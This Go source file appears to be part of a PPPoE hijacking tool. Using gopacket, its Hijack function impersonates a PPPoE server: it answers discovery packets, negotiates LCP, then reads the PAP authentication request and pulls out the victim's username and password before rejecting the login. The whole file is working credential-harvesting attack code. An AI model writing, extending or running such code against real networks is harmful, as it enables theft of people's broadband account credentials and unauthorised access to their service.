package actions

import (
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

func Hijack(packet gopacket.Packet) []string {
	if ethernetLayer := packet.Layer(layers.LayerTypeEthernet); ethernetLayer != nil {
		ethernetPacket := ethernetLayer.(*layers.Ethernet)

		if pppoeLayer := packet.Layer(layers.LayerTypePPPoE); pppoeLayer != nil {
			if pppoePacket, ok := pppoeLayer.(*layers.PPPoE); ok {

				if ethernetPacket.EthernetType == layers.EthernetTypePPPoEDiscovery {
					switch pppoePacket.Code {
					case layers.PPPoECodePADI:
						fmt.Println("find padi, send pado...")
						sendPadoPacket(ethernetPacket, pppoePacket)
					case layers.PPPoECodePADR:
						fmt.Println("find padr, send pads...")
						sendPadsPacket(ethernetPacket, pppoePacket)
					}
				} else if ethernetPacket.EthernetType == layers.EthernetTypePPPoESession {
					if pppLayer := packet.Layer(layers.LayerTypePPP); pppLayer != nil {
						if pppPacket, ok := pppLayer.(*layers.PPP); ok {
							switch string(pppPacket.Contents) {
							// LCP
							case "\xc0\x21":
								sendLcpReq(ethernetPacket, pppPacket)
								// Auth Req
							case "\xc0\x23":
								username, password := getPapInfo(pppPacket.Payload)
								sendPapAuthReject(ethernetPacket, pppPacket)
								return []string{username, password}
							}
						}
					}
				}

			}
		}
	}

	return nil
}

func getPapInfo(body []byte) (string, string) {
	return string(body[5 : 5+body[4]]), string(body[6+body[4]:])
}
